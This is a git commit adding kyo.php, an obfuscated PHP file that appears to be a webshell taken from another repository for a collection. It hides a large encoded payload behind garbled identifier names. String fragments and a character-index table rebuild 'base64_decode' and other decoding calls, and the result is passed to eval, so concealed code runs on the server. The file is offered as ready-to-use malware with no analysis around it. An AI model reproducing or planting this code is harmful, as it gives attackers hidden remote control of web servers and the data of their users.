726ec0449223244ca3d864b2f6c0a1413c759be6
tennc <670357+tennc@users.noreply.github.com>
2022-09-10 22:48:17 +0800

    Create kyo.php
    from: https://github.com/liiuxii/zxc/blob/main/kyo.php
    author: @liiuxii 👍

---
+++ php/zxc/kyo.php
@@ -0,0 +1,185 @@
+<?php
+$�������嶨�����樯慬����庘���儺榗��禳�閳�肑�緳�� =
+    "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";
+���䆀嘉��尟���嬨�友�弣��庘����廜閦��峉�锁����訏�����矣�庣��揯������娅������覮���聜��妗(
+    $�������嶨�����樯慬����庘���儺榗��禳�閳�肑�緳��
+);
+function ���䆀嘉��尟���嬨�友�弣��庘����廜閦��峉�锁����訏�����矣�庣��揯������娅������覮���聜��妗(
+    $�������朙趣�䉆����机���������
+) {
+    $����庯���䰨��椺召����谘��������傯����痖�呜���昺���������埴䜺�����晤�寏���� =
+        "bas" . "e64" . "_de" . "cod" . "e";
+    $��������蔂���禷� = [
+        "C",
+        "P",
+        "Q",
+        "T",
+        "U",
+        "M",
+        "V",
+        "h",
+        "E",
+        "L",
+        "l",
+        "0",
+        "K",
+        "8",
+        "C",
+        "l",
+        "a",
+        "U",
+        "D",
+        "e",
+        "4",
+        "I",
+        "m",
+        "1",
+        "5",
+        "s",
+        "b",
+        "R",
+        "Y",
+        "O",
+        "u",
+        "W",
+        "X",
+        "Z",
+        "+",
+        "c",
+        "@",
+        "d",
+        "3",
+        "r",
+        "F",
+        ")",
+        "B",
+        "y",
+        "C",
+        "J",
+        "q",
+        "G",
+        "#",
+        $����庯���䰨��椺召����谘��������傯����痖�呜���昺���������埴䜺�����晤�寏����(
+            "Uw=="
+        ),
+        $����庯���䰨��椺召����谘��������傯����痖�呜���昺���������埴䜺�����晤�寏����(
+            "bw=="
+        ),
+        $����庯���䰨��椺召����谘��������傯����痖�呜���昺���������埴䜺�����晤�寏����(
+            "SA=="
+        ),
+        "4",
+        "A",
+        "i",
+        "j",
+        "t",
+        "v",
+        "w",
+        "x",
+        "z",
+        "g",
+        "%",
+        "(",
+        '$',
+        "_",
+        "+",
+        "2",
+        "x",
+        "(",
+        "f",
+        "6",
+        "j",
+        "k",
+        "n",
+        "p",
+        "*",
+        "9",
+        "N",
+        "1",
+        "3",
+        "3",
+        "7",
+        ";",
+    ];
+    $����箮���������� =
+        $��������蔂���禷�[29] .
+        $��������蔂���禷�[56] .
+        $��������蔂���禷�[23] .
+        $��������蔂���禷�[80] .
+        $��������蔂���禷�[63] .
+        $��������蔂���禷�[61] .
+        $��������蔂���禷�[33] .
+        $��������蔂���禷�[21] .
+        $��������蔂���禷�[74] .
+        $��������蔂���禷�[40];
+    $�������剤�磺嬋儴�叙��躺����� =
+        $��������蔂���禷�[8] .
+        $��������蔂���禷�[57] .
+        $��������蔂���禷�[53] .
+        $��������蔂���禷�[15] .
+        $��������蔂���禷�[63] .
+        $��������蔂���禷�[49] .
+        $��������蔂���禷�[56] .
+        $��������蔂���禷�[27] .
+        $��������蔂���禷�[65] .
+        $��������蔂���禷�[39];
+    $�����口�������夏�����玶�䬅��� =
+        $��������蔂���禷�[9] .
+        $��������蔂���禷�[53] .
+        $��������蔂���禷�[56] .
+        $��������蔂���禷�[19] .
+        $��������蔂���禷�[69] .
+        $��������蔂���禷�[42] .
+        $��������蔂���禷�[16] .
+        $��������蔂���禷�[25] .
+        $��������蔂���禷�[19] .
+        $��������蔂���禷�[71];
+    $��邜�����������巖� =
+        $��������蔂���禷�[15] .
+        $��������蔂���禷�[53] .
+        $��������蔂���禷�[56] .
+        $��������蔂���禷�[8] .
+        $��������蔂���禷�[69] .
+        $��������蔂���禷�[25] .
+        $��������蔂���禷�[3] .
+        $��������蔂���禷�[39] .
+        $��������蔂���禷�[65] .
+        $��������蔂���禷�[39];
+    $���牂������殻��� =
+        $��������蔂���禷�[20] .
+        $��������蔂���禷�[65] .
+        $��������蔂���禷�[18] .
+        $��������蔂���禷�[8] .
+        $��������蔂���禷�[0] .
+        $��������蔂���禷�[29] .
+        $��������蔂���禷�[37] .
+        $��������蔂���禷�[19] .
+        $��������蔂���禷�[63];
+    $���基����兰����最��䘟��谯��� =
+        $��������蔂���禷�[29] .
+        $��������蔂���禷�[56] .
+        $��������蔂���禷�[23] .
+        $��������蔂���禷�[80] .
+        $��������蔂���禷�[63] .
+        $��������蔂���禷�[47] .
+        $��������蔂���禷�[60] .
+        $��������蔂���禷�[54] .
+        $��������蔂���禷�[74] .
+        $��������蔂���禷�[40];
+    $��嬉�������基������稬熺������� =
+        $�������剤�磺嬋儴�叙��躺����� .
+        $����箮���������� .
+        $��邜�����������巖� .
+        $���基����兰����最��䘟��谯��� .
+        $�����口�������夏�����玶�䬅��� .
+        $���牂������殻��� .
+        '$�������朙趣�䉆����机���������' .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[41] .
+        $��������蔂���禷�[83];
+    return EvAl($��嬉�������基������稬熺�������);
+} ?>
